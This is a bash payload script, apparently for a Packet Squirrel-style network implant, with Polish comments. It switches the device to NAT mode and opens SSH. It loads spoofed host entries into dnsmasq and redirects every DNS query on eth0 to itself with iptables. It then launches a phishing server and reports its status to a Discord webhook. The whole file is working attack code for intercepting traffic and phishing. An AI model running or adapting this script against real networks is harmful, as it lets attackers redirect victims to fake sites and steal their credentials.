#!/bin/bash
# DNS Spoofing – switch=2, NETMODE NAT, iptables REDIRECT + dnsmasq

DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/TWOJ_WEBHOOK_URL"

send_to_discord() {
    local msg="$1"
    wget -q --no-check-certificate --header='Content-Type: application/json' \
         --post-data="$(printf '{"content": "%s"}' "$msg")" \
         "$DISCORD_WEBHOOK_URL" -O /dev/null
}

LOG_DIR="/root/payloads/switch2"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/payload.log"

log() {
    echo "[$(date +%H:%M:%S)] $*" >> "$LOG_FILE"
    echo "$*"
}

log "=== start ==="
LED SETUP

NETMODE NAT
sleep 5

for i in $(seq 1 15); do
    WAN_IP=$(ip addr show eth1 2>/dev/null | grep "inet " | awk '{print $2}')
    [ -n "$WAN_IP" ] && break
    sleep 1
done
log "IP: ${WAN_IP:-BRAK}"

iptables -I INPUT -p tcp --dport 22 -j ACCEPT

MY_IP=$(echo "$WAN_IP" | cut -d/ -f1)
if [ -z "$MY_IP" ]; then
    MY_IP=$(ip addr show eth0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
fi
send_to_discord ":green_circle: PS uruchomiony!\\nTryb: DNS Spoofing"

cp $(dirname ${BASH_SOURCE[0]})/spoofhost /tmp/dnsmasq.address &> /dev/null
/etc/init.d/dnsmasq restart
sleep 2

iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53

python /root/payloads/switch2/phishing_server.py &
PHISH_PID=$!

LED ATTACK

NO_LED=true BUTTON

kill $PHISH_PID 2>/dev/null
iptables -D PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null

sync
LED R SUCCESS
sleep 1
LED OFF
halt
